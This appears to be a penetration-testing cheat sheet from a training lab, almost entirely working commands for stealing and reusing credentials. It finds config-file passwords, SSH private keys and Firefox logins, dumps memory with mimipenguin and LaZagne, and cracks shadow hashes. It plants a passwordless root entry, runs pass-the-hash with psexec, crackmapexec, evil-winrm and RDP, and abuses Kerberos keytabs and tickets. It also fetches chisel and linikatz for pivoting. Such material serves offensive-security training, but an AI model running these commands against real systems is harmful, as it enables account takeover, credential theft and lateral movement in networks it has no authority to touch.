## Credential Hunting

### Configuration Files
```bash
## Search for config files
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

## Searching for credentials in config files
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

### Databases

```bash
## Search for database files
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

### Notes

```bash
## Search for notes
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

### Scripts

```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

### Cronjobs

```bash
cat /etc/crontab 
ls -la /etc/cron.*/
```

### SSH Keys

```bash
## Search for ssh private keyssm
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

## Search for ssh public keys
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

### History 

| **Log File**   | **Description**   |
| --------------|-------------------|
|/var/log/messages|	Generic system activity logs.|
|/var/log/syslog|	Generic system activity logs.|
|/var/log/auth.log|	(Debian) All authentication related logs.|
|/var/log/secure|	(RedHat/CentOS) All authentication related logs.|
|/var/log/boot.log|	Booting information.|
|/var/log/dmesg|	Hardware and drivers related information and logs.|
|/var/log/kern.log|	Kernel related warnings, errors and logs.|
|/var/log/faillog|	Failed login attempts.|
|/var/log/cron|	Information related to cron jobs.|
|/var/log/mail.log|	All mail server related logs.|
|/var/log/httpd|	All Apache related logs.|
|/var/log/mysqld.log|	All MySQL server related logs.|

```bash
## Bash history
tail -n5 /home/*/.bash*

## Logs
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

### Memory & Cache

```bash
## Memory dumping
sudo python3 mimipenguin.py 
sudo python2.7 laZagne.py all

## Firefox stored credentials
ls -l .mozilla/firefox/ | grep default 
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
python3.9 firefox_decrypt.py
```

## Password Files

### Passwd

```bash
## Rare scenario - passwd is editable
root::0:0:root:/root:/bin/bash  # Allow for straight root access

## Un shadowing password file
sudo cp /etc/passwd /tmp/passwd.bak 
sudo cp /etc/shadow /tmp/shadow.bak
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

### Opasswd

```bash
## Location of old password file
sudo cat /etc/security/opasswd
```

## Pass the Hash

### Impacket PsExec

```bash
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

### CrackMapExec

```bash
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

## Execute command option
crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

### Evil-WinRM

```bash
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

### RDP 

```powershell
## Enable restricted admin mode to allow pth
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

## Pass the hash using rdp
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

### Limitations

_UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well._

_If the registry key FilterAdministratorToken (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account._

## Pass the Ticket

Linux machines store Kerberos tickets as ccache files in the /tmp directory. By default, the location of the Kerberos ticket is stored in the environment variable KRB5CCNAME.

Another everyday use of Kerberos in Linux is with keytab files. A keytab is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password).

### Identifying Linux and AD Integration

```bash
## Use realm tool to check for domain environment
realm list

## Alternatively if realm is not available, look for services sssd or winbind
ps -ef | grep -i "winbind\|sssd"
```

### Finding Kerberos Ticket

```bash
## Find Keytab file
find / -name *keytab* -ls 2>/dev/null

## Alternatively, Keytab can be located in Cronjobs
crontab -l

## Find ccache file
env | grep -i krb5

## Search for ccache file in default directory
ls -la /tmp
```

### Abusing KeyTab

```bash
## List keytab information
klist -k -t 

## Impersonate user with keytab
klist 
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab

## Connect to target machine i.e.
smbclient //dc01/carlos -k -c ls

## Abuse via keytab extract
## https://github.com/sosdave/KeyTabExtract
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
```

### Abusing Ccache

To abuse a ccache file, all we need is read privileges on the file. These files, located in /tmp, can only be read by the user who created them, but if we gain root access, we could use them.

```bash
## Import ccache file to current session
cp /tmp/krb5cc_647401106_I8I133 .
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
```

### Linux Attack Tools with Kerberos

```bash
## Modify our proxychains configuration file to use socks5 and port 1080
## Download chisel on Attack Host
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_* chisel && chmod +x ./chisel
sudo ./chisel server --reverse 

## Set KRB5CCNAME Environment Variable
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133

## Use Impacket with proxychains and Kerberos Auth
proxychains impacket-wmiexec dc01 -k

## Use winrm with Kerberos
sudo apt-get install krb5-user -y
proxychains evil-winrm -i dc01 -r inlanefreight.htb

## Converting ccache file for use in Windows or kirbi file for use in Linux
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi

## Alternatively, Linikatz
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
/opt/linikatz.sh
```
